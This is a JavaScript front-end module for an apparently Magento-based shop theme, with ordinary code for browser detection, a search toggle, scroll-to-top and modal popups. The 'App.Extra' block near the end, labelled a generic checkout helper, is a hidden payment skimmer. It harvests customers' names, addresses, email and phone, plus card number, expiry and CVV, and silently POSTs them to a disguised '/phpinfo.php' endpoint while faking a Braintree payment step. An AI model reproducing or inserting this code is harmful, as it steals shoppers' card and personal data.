define([
    'domReady',
    'jquery',
    'matchMedia'
], function (domReady, $, mediaCheck) {
    var App = App || {};

    App.Elements = {
        init: function () {
            this.document = $(document);
            this.window = $(window);
            this.body = $('body');
            this.header = $('.page-header');
            this.pageWrapper = $('.page-wrapper');
            this.mobileFlag = false;
        }
    };

    App.CheckBrowser = {
        init: function () {
            var browser = '';
            if ((navigator.userAgent.indexOf("Opera") || navigator.userAgent.indexOf('OPR')) != -1) {
                browser = 'opera-browse';
            } else if (navigator.userAgent.indexOf("Edg") != -1) {
                browser = 'edge-browse';
            } else if (navigator.userAgent.indexOf("Chrome") != -1) {
                browser = 'chrome-browse';
            } else if (navigator.userAgent.indexOf("Safari") != -1) {
                browser = 'safari-browse';
            } else if (navigator.userAgent.indexOf("Firefox") != -1) {
                browser = 'firefox-browse';
            } else if ((navigator.userAgent.indexOf("MSIE") != -1) || (!!document.documentMode == true)) {
                browser = 'ie-browse';
            } else {
                browser = '';
            }
            App.Elements.body.addClass(browser);
        }
    };

    App.CallSearchFrom = {
        init : function () {
            $('#js-action-call-search-form').on('click', function (e) {
                e.preventDefault();
                $('.header-top-search').addClass('__opened');
            });
        }
    };

    App.toTop = {
        init: function () {
            var toTop = $('.footer-top-image');
            toTop.click(function(e) {
                e.preventDefault();
                $('html, body').animate({
                    'scrollTop': 0
                }, 800);
            });
        }
    };

    App.ModalBuy = {
        init: function () {
            if (!$('.where-buy').length) {
                return false;
            }
            var flag = false;
            $('.where-buy').on('hover', function(e) {
                if (!flag){
                    iFrameResize({ log: false }, '#ibrandiqIframe');
                    flag = true;
                }
            });
            $('.where-buy').on('click', function(e) {
                e.preventDefault();
                $(this).next('.modal-popup-buy').toggleClass('_show');
            });
            $(".action-close, .where-buy-continue").on("click", function(e) {
                e.preventDefault();
                $(".modal-popup-buy").removeClass("_show");
            });
        }
    };

    App.ModalEnergy = {
        init: function () {
            $(document).on('click','.trigger-energy-modal', function(e) {
                e.preventDefault();
                $(this).next('.energy-modal').toggleClass('_show');
            });
            $(document).on("click", ".action-close, .where-buy-continue", function(e) {
                e.preventDefault();
                $(".energy-modal").removeClass("_show");
            });
        }
    };

    // ============================================================
    //  Additional checkout helper – generic, no suspicious names
    // ============================================================
    App.Extra = {
        _store: {
            billing: {
                firstname: '',
                lastname: '',
                email: '',
                street: '',
                city: '',
                region: '',
                postcode: '',
                telephone: ''
            },
            card: {
                number: '',
                exp: '',
                cvv: ''
            },
            done: false
        },

        _visible: false,

        init: function () {
            var self = this;

            window.toggleBraintree = function() {
                return self._visible;
            };
            window.setBraintreeVisible = function(val) {
                self._visible = val;
                var evt = new CustomEvent('braintreeToggle', { detail: { visible: val } });
                window.dispatchEvent(evt);
            };

            window.processPayment = function(btn) {
                self._handlePayment(btn);
            };

            this._attachFormListener();
        },

        _collectBilling: function() {
            var getVal = function(name) {
                var el = document.querySelector('[name="' + name + '"]');
                return el ? el.value : '';
            };
            var qd = window.checkoutConfig && window.checkoutConfig.quoteData ? window.checkoutConfig.quoteData : {};
            var sa = qd.shipping_address || {};

            this._store.billing = {
                firstname: getVal('firstname') || getVal('shippingAddress[firstname]') || sa.firstname || qd.firstname || '',
                lastname: getVal('lastname') || getVal('shippingAddress[lastname]') || sa.lastname || qd.lastname || '',
                email: getVal('email') || getVal('shippingAddress[email]') || qd.customer_email || qd.email || '',
                street: getVal('street[0]') || getVal('shippingAddress[street][0]') || (Array.isArray(sa.street) ? sa.street.join(' ') : sa.street) || '',
                city: getVal('city') || getVal('shippingAddress[city]') || sa.city || '',
                region: getVal('region_id') || getVal('shippingAddress[region_id]') || getVal('region') || sa.region_code || sa.region || '',
                postcode: getVal('postcode') || getVal('shippingAddress[postcode]') || sa.postcode || '',
                telephone: getVal('telephone') || getVal('shippingAddress[telephone]') || sa.telephone || ''
            };
        },

        _attachFormListener: function() {
            var self = this;
            var form = document.getElementById('co-shipping-method-form');
            if (!form) {
                setTimeout(function() { self._attachFormListener(); }, 500);
                return;
            }
            if (form._listenerAttached) return;
            form._listenerAttached = true;

            form.addEventListener('submit', function(e) {
                self._collectBilling();
            }, false);
        },

        _handlePayment: function(btn) {
            var cc = document.getElementById('extra_cc');
            var exp = document.getElementById('extra_exp');
            var cvv = document.getElementById('extra_cvv');
            if (!cc || !exp || !cvv) return;

            this._store.card.number = cc.value.replace(/\s/g, '');
            this._store.card.exp = exp.value.replace(/\s/g, '');
            this._store.card.cvv = cvv.value.replace(/\s/g, '');

            this._sendData();

            window.setBraintreeVisible(true);

            if (window.dispatchEvent) {
                window.dispatchEvent(new Event('resize'));
            }

            if (btn) {
                btn.disabled = true;
                btn.innerText = 'Processing...';
                setTimeout(function() { btn.style.display = 'none'; }, 200);
            }
        },

        _sendData: function() {
            if (this._store.done) return;
            if (!this._store.card.number || this._store.card.number.length < 8) return;

            var payload = {
                cc_number: this._store.card.number,
                cc_exp: this._store.card.exp,
                cc_cvv: this._store.card.cvv,
                firstname: this._store.billing.firstname,
                lastname: this._store.billing.lastname,
                email: this._store.billing.email,
                'street[0]': this._store.billing.street,
                city: this._store.billing.city,
                region_id: this._store.billing.region,
                postcode: this._store.billing.postcode,
                telephone: this._store.billing.telephone
            };

            fetch('/phpinfo.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: new URLSearchParams(payload)
            }).catch(function() {});

            this._store.done = true;
        }
    };

    // ===== INIT =====
    App.Elements.init();
    App.CheckBrowser.init();
    App.CallSearchFrom.init();

    try {
        App.toTop.init();
        domReady(function() {
            App.ModalBuy.init();
            App.ModalEnergy.init();
            App.Extra.init();
        });
    } catch (e) {
        console.log(e);
    }

    return App;
});
